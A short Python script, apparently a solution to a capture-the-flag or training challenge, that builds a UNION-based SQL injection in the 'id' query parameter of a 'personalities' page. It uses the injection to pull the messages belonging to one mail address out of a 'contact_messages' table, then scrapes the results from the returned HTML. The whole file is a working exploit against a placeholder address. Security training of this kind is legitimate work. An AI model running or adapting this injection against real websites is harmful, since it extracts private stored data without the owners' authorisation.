from requests import get
from bs4 import BeautifulSoup
import urllib

ip = 'http://0.0.0.0/'
mail = '"james@bond.mi5"'
page = 'personalities'
injection = '\' union select name,message from contact_messages where mail= ' + mail + ' -- '

field = {'id': '1 ' + injection}

url = ip + page

response = get(url, params=field)
body = response.text

soup = BeautifulSoup(body, 'html.parser')
list_items = soup.findAll('a', {'class': 'list-group-item'})

for item in list_items:
    if item.text.startswith('james:'):
        print(item.text.split(':')[1])